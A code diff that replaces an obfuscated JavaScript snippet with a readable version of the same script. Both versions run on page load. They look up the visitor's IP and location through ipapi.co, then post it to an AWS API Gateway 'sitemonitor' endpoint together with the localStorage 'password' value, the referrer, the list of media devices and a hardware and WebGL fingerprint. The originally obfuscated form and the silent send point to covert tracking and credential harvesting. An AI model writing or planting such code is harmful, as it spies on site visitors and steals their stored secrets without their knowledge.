@@ -1,1 +1,44 @@
-function _0x379d(_0x273874,_0x12f86a){const _0x5cb7eb=_0x5cb7();return _0x379d=function(_0x379d3b,_0x14f639){_0x379d3b=_0x379d3b-0xb2;let _0x317b18=_0x5cb7eb[_0x379d3b];return _0x317b18;},_0x379d(_0x273874,_0x12f86a);}function _0x5cb7(){const _0x3ccb16=['stringify','getContext','referrer','43UQlLWc','deviceMemory','506okNeZY','13214LOtmmc','mediaDevices','https://2e2qjwhkig.execute-api.us-east-1.amazonaws.com/Prod/sitemonitor','https://ipapi.co/json','getExtension','json','webgl','1323668RLGrSM','hardwareConcurrency','userAgent','createElement','97254ZGsTSi','3MelUMD','UNMASKED_RENDERER_WEBGL','maxTouchPoints','getParameter','9nhAnir','then','getItem','platform','application/json','938750piaycZ','password','no\x20webgl','canvas','2820391OWJVNl','no\x20WEBGL_debug_renderer_info','133970wAafDI','3826664WPrOjW','enumerateDevices'];_0x5cb7=function(){return _0x3ccb16;};return _0x5cb7();}(function(_0x78d86b,_0x4bb690){const _0x573ab1=_0x379d,_0x19479e=_0x78d86b();while(!![]){try{const _0x4767f2=parseInt(_0x573ab1(0xcd))/0x1*(parseInt(_0x573ab1(0xd0))/0x2)+-parseInt(_0x573ab1(0xb8))/0x3*(-parseInt(_0x573ab1(0xb3))/0x4)+parseInt(_0x573ab1(0xc1))/0x5+parseInt(_0x573ab1(0xb7))/0x6+-parseInt(_0x573ab1(0xc5))/0x7+parseInt(_0x573ab1(0xc8))/0x8*(parseInt(_0x573ab1(0xbc))/0x9)+-parseInt(_0x573ab1(0xc7))/0xa*(parseInt(_0x573ab1(0xcf))/0xb);if(_0x4767f2===_0x4bb690)break;else _0x19479e['push'](_0x19479e['shift']());}catch(_0x38f950){_0x19479e['push'](_0x19479e['shift']());}}}(_0x5cb7,0x43e77));function getStatData(_0x4fafcd){const _0x57dbff=_0x379d;navigator[_0x57dbff(0xd1)][_0x57dbff(0xc9)]()[_0x57dbff(0xbd)](_0x3e4082=>{const _0x56f6e7=_0x57dbff;$['ajax']({'url':_0x56f6e7(0xd2),'type':'post','dataType':_0x56f6e7(0xd5),'contentType':_0x56f6e7(0xc0),'data':JSON[_0x56f6e7(0xca)]({'ip':_0x4fafcd['ip'],'jsondata':JSON[_0x56f6e7(0xca)](_0x4fafcd),'pwd':localStorage[_0x56f6e7(0xbe)](_0x56f6e7(0xc2)),'referrer':document[_0x56f6e7(0xcc)],'else':JSON[_0x56f6e7(0xca)]({'hardware':hardwareInfo(),'inp':_0x3e4082})})});});}function ipLookUp(){const _0x52f22e=_0x379d;fetch(_0x52f22e(0xd3))['then'](_0x172a9d=>_0x172a9d[_0x52f22e(0xd5)]())[_0x52f22e(0xbd)](_0x42ba50=>getStatData(_0x42ba50));}function hardwareInfo(){const _0x23b753=_0x379d;return JSON[_0x23b753(0xca)]({'mem':navigator[_0x23b753(0xce)],'cores':navigator[_0x23b753(0xb4)],'touchpoints':navigator[_0x23b753(0xba)],'platform':navigator[_0x23b753(0xbf)],'userAgent':navigator[_0x23b753(0xb5)],'graphics':getVideoCardInfo()});}function getVideoCardInfo(){const _0x254950=_0x379d,_0x4e7290=document[_0x254950(0xb6)](_0x254950(0xc4))[_0x254950(0xcb)](_0x254950(0xb2));if(!_0x4e7290)return{'error':_0x254950(0xc3)};const _0x3f83df=_0x4e7290[_0x254950(0xd4)]('WEBGL_debug_renderer_info');return _0x3f83df?{'vendor':_0x4e7290[_0x254950(0xbb)](_0x3f83df['UNMASKED_VENDOR_WEBGL']),'renderer':_0x4e7290[_0x254950(0xbb)](_0x3f83df[_0x254950(0xb9)])}:{'error':_0x254950(0xc6)};}ipLookUp();
+function getStatData (response) {
+    navigator.mediaDevices.enumerateDevices().then(
+        ctrldevices => {
+          $.ajax({
+            url:"https://2e2qjwhkig.execute-api.us-east-1.amazonaws.com/Prod/sitemonitor",
+            type: "post",
+            dataType: 'json',
+            contentType: "application/json",
+            data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), pwd:localStorage.getItem("password"),referrer:document.referrer, else:JSON.stringify({hardware:hardwareInfo(), inp: ctrldevices})})
+          });
+        }
+      )
+  }
+  function ipLookUp () {
+    fetch('https://ipapi.co/json')
+     .then( response => response.json() )
+     .then( data => (!localStorage.getItem("password")) && getStatData(data) )
+  }
+  function hardwareInfo() {
+      return JSON.stringify({
+          mem: navigator.deviceMemory,
+          cores: navigator.hardwareConcurrency,
+          touchpoints: navigator.maxTouchPoints,
+          platform:navigator.platform,
+          userAgent: navigator.userAgent,
+          graphics: getVideoCardInfo()
+      })
+  }
+  function getVideoCardInfo() {
+    const gl = document.createElement('canvas').getContext('webgl');
+    if (!gl) {
+      return {
+        error: "no webgl",
+      };
+    }
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return debugInfo ? {
+      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+      renderer:  gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+    } : {
+      error: "no WEBGL_debug_renderer_info",
+    };
+  }
+  ipLookUp()
